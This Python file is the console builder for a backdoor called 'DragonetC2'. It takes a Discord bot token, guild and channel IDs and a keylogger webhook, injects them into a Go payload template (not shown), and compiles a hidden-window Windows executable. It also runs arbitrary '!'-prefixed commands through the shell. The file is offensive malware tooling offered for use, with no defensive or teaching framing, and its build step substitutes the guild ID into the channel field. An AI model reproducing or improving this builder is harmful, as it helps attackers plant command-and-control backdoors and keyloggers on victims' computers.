import os, sys, time
from prettytable import PrettyTable
from colorama import Fore, Style

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def createTable(list):
    table = PrettyTable(["Setting", "Value"])
    table.add_row(["Backdoor Name", list[0]])

    if payload == "discord":
        table.add_row(["Guild ID", list[1]])
        table.add_row(["Bot Token", list[2]])
        table.add_row(["Channel ID", list[3]])
        table.add_row(["Keylogger Webhook", list[4]])
    else:
        print(Fore.RED+'[!] Please select a payload!\n')
    return table

def help_menu(command_list, payload=""):
    if len(command_list) == 1:
        print(Fore.YELLOW+'''\n
        Help Menu:

        "help <command>" - Displays more help for a specific command

        "use <payload>" - Selects a payload to use

        "set <setting> <value>" - Sets a value to a valid setting

        "show" - Shows the settings and their values

        "build" - Packages the backdoor into an EXE file
        
        "!<command>" - Executes a system command

        "exit" - Terminates the builder
        \n''')
    else:
        if command_list[1] == "use":
            print(Fore.YELLOW+'''\n
        Help Menu:

        "use <payload>" - Selects a payload to use

        Payloads:

        "discord" - A Discord based C2
        "telegram" - A Telegram based C2
        "github" - A GitHub based C2
        ''')
        
        elif command_list[1] == "set":
            if payload == "":
                print(Fore.YELLOW+"[!] Please select a payload first!\n")
            else:
                if payload == "discord":
                    print('''\n
        Help Menu:

        "set <setting> <value>" - Sets a value to a valid setting

        Settings for Discord C2:

        "name" - The name of the backdoor
        "guild-id" - The ID of the Discord server
        "bot-token" - The token of the Discord bot
        "channel-id" - The ID of the Discord channel
        "webhook" - The webhook for the keylogger
                    ''')
                else:
                    print(Fore.RED+"[!] Unsupported payload selected!\n")
        elif command_list[1] in ["build", "exit", "show", "clear"]:
            print(Fore.YELLOW+"[!] There is nothing more to show for this command!\n")
        
        else:
            print(Fore.RED+"[!] Invalid command!\n")

clear_screen()

message = 'starting the DragonetC2...'
for x in range(len(message)):
    sys.stdout.write(Fore.YELLOW+'\r'+'[*] '+message[:x]+message[x:].capitalize())
    sys.stdout.flush()
    time.sleep(0.1)
    if x == len(message)-1:
        clear_screen()

print(Fore.GREEN+'''
┳┓┳┓┏┓┏┓┏┓┳┓┏┓┏┳┓ ┏┓┏┓
┃┃┣┫┣┫┃┓┃┃┃┃┣  ┃  ┃ ┏┛
┻┛┛┗┛┗┗┛┗┛┛┗┗┛ ┻  ┗┛┗━
Made by V31l_0x1 | Twitter: @v31l_0x1 \n\nRun 'help use' to get started!'''.lstrip('\n'))

list = ["None", "None", "None", "None", "None"]

payload = ""
try:
    while True:
        command = input(Fore.GREEN+f'[+] {payload} > '+Fore.WHITE)
        command_list = command.split()

        if command_list == []:
            continue

        elif command_list[0] == 'use':
            if len(command_list) == 1:
                print(Fore.RED+'[!] Please specify a payload!')
            else:
                if command_list[1] == "discord":
                    print(Fore.YELLOW+'\n[+] Discord payload selected!')
                    payload = "discord"
                    table = createTable(list)
                    print(f"\n{table.get_string(title='Dragonet Backdoor Settings')}")
                    print(Fore.YELLOW+'\n[+] Use "set" to set the settings for the backdoor.\n')

        elif command_list[0] == 'set':
            if len(command_list) < 3:
                print(Fore.RED+'[!] Please specify a setting!\n!')
            else:
                if command_list[1] == "name":
                    list[0] = command_list[2]
                elif command_list[1] == "guild-id":
                    list[1] = command_list[2]
                elif command_list[1] == "bot-token":
                    list[2] = command_list[2]
                elif command_list[1] == "channel-id":
                    list[3] = command_list[2]
                elif command_list[1] == "webhook":
                    list[4] = command_list[2]
                else:
                    print(Fore.YELLOW+'[!] Invalid setting!')
        
        elif command_list[0] == 'show':
            if payload == "":
                print(Fore.YELLOW+'[!] Please select a payload!')
            else:
                table = createTable(list)
                print(Fore.YELLOW+f"\n{table.get_string(title='Dragonet Backdoor Settings')}")
                print(Fore.YELLOW+"\n[+] Run 'help set' for more information\n")
        
        elif command_list[0] == 'build':
            print(Fore.YELLOW+'\n[+] Building the backdoor...')
            if payload == "discord":
                # Use utf-8 encoding to read the file
                with open("main.go", "r", encoding="utf-8") as f:
                    file = f.read()

                newfile = file.replace("CHANNEL_ID", str(list[1]))
                newfile = newfile.replace("BOT_TOKEN", str(list[2]))

                with open(list[0]+".go", 'w', encoding="utf-8") as f:
                    f.write(newfile)

                os.system(f"go build -ldflags=\" -w -s -H=windowsgui\" {list[0]}.go")
                os.system("del "+list[0]+".go")
                print(Fore.GREEN+f'[+] {list[0]}.exe has been created!')
            else:
                print(Fore.RED+'[!] Please select a payload!\n')

        elif command_list[0] == 'exit':
            print(Fore.RED+'\n[+] Exiting...')
            exit()

        elif command.startswith('!'):
            os.system(command[1:])

        elif command_list[0] == 'clear':
            clear_screen()

        elif command_list[0] == "help":
            help_menu(command_list,payload=payload)


        else:
            print(Fore.YELLOW+'Invalid command. Run "help use" to see the available commands.')
except KeyboardInterrupt:   
    print('\n\nExiting...')

